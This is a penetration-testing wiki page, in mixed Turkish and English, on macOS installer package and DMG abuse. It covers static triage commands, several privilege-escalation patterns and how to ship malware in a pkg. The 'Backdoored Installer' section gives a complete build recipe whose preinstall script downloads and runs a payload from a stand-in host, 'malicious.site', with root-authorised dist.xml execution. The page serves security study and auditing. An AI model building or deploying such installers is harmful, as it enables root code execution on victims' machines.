# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Bir macOS **installer package** (`.pkg` file` olarak da bilinir), macOS tarafından **software dağıtmak** için kullanılan bir dosya formatıdır. Bu dosyalar, bir software parçasının doğru şekilde install edilip çalışması için gereken her şeyi içeren bir **kutu** gibidir.

Package dosyasının kendisi, hedef bilgisayara install edilecek **files ve directories hiyerarşisini** barındıran bir arşivdir. Ayrıca, configuration files ayarlama veya software'in eski versiyonlarını temizleme gibi, installation öncesi ve sonrası görevleri gerçekleştirmek için **scripts** de içerebilir.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) ve script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, çalıştırılacak scripts için paths
- **Bill of materials (bom)**: file permissions ile birlikte install, update veya remove edilecek files listesi
- **Payload (CPIO archive gzip compressed)**: PackageInfo içindeki `install-location` konumuna install edilecek files
- **Scripts (CPIO archive gzip compressed)**: Pre ve post install scripts ve execution için temp directory'ye çıkarılan daha fazla resource

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Kurulum paketinin içeriğini elle decompress etmeden görselleştirmek için ücretsiz araç [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) da kullanabilirsiniz.

### Static triage shortcuts

Amaç analysis ise, önce paketi `Installer.app` ile açmaktan **kaçınmaya** çalışın. Bazı paketler, `Installer` onları açar açmaz code çalıştırabilir (örneğin `system.run()` veya installer plug-ins üzerinden), bu yüzden offline extraction genellikle daha güvenli başlangıçtır.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Temel Bilgiler

DMG dosyaları, veya Apple Disk Images, Apple’ın macOS sisteminde disk image’lar için kullanılan bir dosya formatıdır. Bir DMG dosyası aslında **mount edilebilir bir disk image**’dır (kendi filesystem’ini içerir) ve tipik olarak sıkıştırılmış, bazen de şifrelenmiş ham block data içerir. Bir DMG dosyasını açtığınızda, macOS onu **fiziksel bir diskmiş gibi mount eder**, böylece içeriğine erişebilirsiniz.

> [!CAUTION]
> **`.dmg`** installer’ların **çok fazla formatı** desteklediğini ve geçmişte bunlardan bazılarında vulnerability bulunanların **kernel code execution** elde etmek için abuse edildiğini unutmayın.

### Hiyerarşi

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Bir DMG dosyasının hiyerarşisi, içeriğe bağlı olarak farklı olabilir. Ancak application DMG’leri için genellikle şu yapıyı izler:

- Top Level: Bu, disk image’ın root’udur. Çoğu zaman application’ı ve muhtemelen Applications klasörüne bir link içerir.
- Application (.app): Bu, gerçek application’dır. macOS’ta bir application genellikle application’ı oluşturan birçok ayrı file ve folder içeren bir package’tir.
- Applications Link: Bu, macOS’teki Applications klasörüne bir shortcut’tır. Bunun amacı application’ı kolayca install etmenizi sağlamaktır. App’i install etmek için .app file’ını bu shortcut’a sürükleyebilirsiniz.

## pkg abuse ile Privesc

### Public directory’lerden execution

Eğer bir pre veya post installation script örneğin **`/var/tmp/Installerutil`** içinden çalıştırılıyorsa ve bir attacker bu script’i kontrol edebiliyorsa, her çalıştırıldığında privileges yükseltebilir. Benzer başka bir örnek:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Bu, birkaç installer ve updater’ın **root olarak bir şey execute etmek** için çağıracağı [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)tir. Bu function, parametre olarak **execute edilecek file**’ın **path**’ini alır; ancak bir attacker bu file’ı **modify** edebilirse, root ile yapılan execution’ı **abuse** ederek **privileges escalate** edebilir.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Daha fazla bilgi için bu konuşmayı kontrol edin: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Modern PackageKit hataları, installer scriptlerinin çoğu zaman **trusted root code** olarak çalıştırıldığını, ancak saldırgan tarafından kontrol edilen bağlamın yakınında tutulduğunu gösterdi. Vendor paketlerini denetlerken şunlara özellikle dikkat edin:

- `#!/bin/zsh` / `#!/bin/bash` gibi Shell interpreterları
- `sudo -u $USER`, `launchctl asuser` gibi çağrılar veya `$USER`, `$HOME`, `PATH`, `TMPDIR` ya da relative path'lere güvenen herhangi bir mantık
- Kullanıcı kontrollü init dosyalarını veya libraries'leri yükleyebilen shell dışı interpreterlar
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs) için [genel macOS privesc sayfasına](../macos-privilege-escalation.md) bakın. Paket **Apple-signed** ise, aynı script bug **SIP/TCC-relevant** hale gelebilir çünkü `system_installd` `com.apple.rootless.install.heritable` taşıyabilir; [SIP sayfasına](../macos-security-protections/macos-sip.md) bakın.

### Execution by mounting

Eğer bir installer `/tmp/fixedname/bla/bla` içine yazıyorsa, kurulum sırasında **herhangi bir dosyayı değiştirmek** ve kurulum sürecini abuse etmek için `/tmp/fixedname` üzerine noowners ile bir **mount oluşturmak** mümkündür.

Bunun bir örneği, root olarak execution almak için **periyodik bir scripti overwrite** etmeyi başaran **CVE-2021-26089**'dur. Daha fazla bilgi için şu konuşmaya bakın: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

Gerçek bir payload olmadan, sadece scriptlerin içindeki malware dışında, **pre ve post-install scripts** içeren bir **`.pkg`** dosyası üretmek mümkündür.

### JS in Distribution xml

Paketin **distribution xml** dosyasına **`<script>`** tagleri eklemek mümkündür ve bu code çalıştırılır; ayrıca **`system.run`** kullanarak komut çalıştırabilir:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution paketlerinde bu genellikle üst düzey `Distribution` dosyasının external scripts'i etkinleştirmesine bağlıdır; örneğin `allow-external-scripts="true"` ile. Bu nedenle yalnızca `preinstall` / `postinstall` incelemek yeterli değildir: **Distribution XML** kendisi `installation-check` / `volume-check` hook'ları ve doğrudan `system.run()` / `system.runOnce()` execution path'leri içerebilir.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml içinde bir script ve JS code kullanarak malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
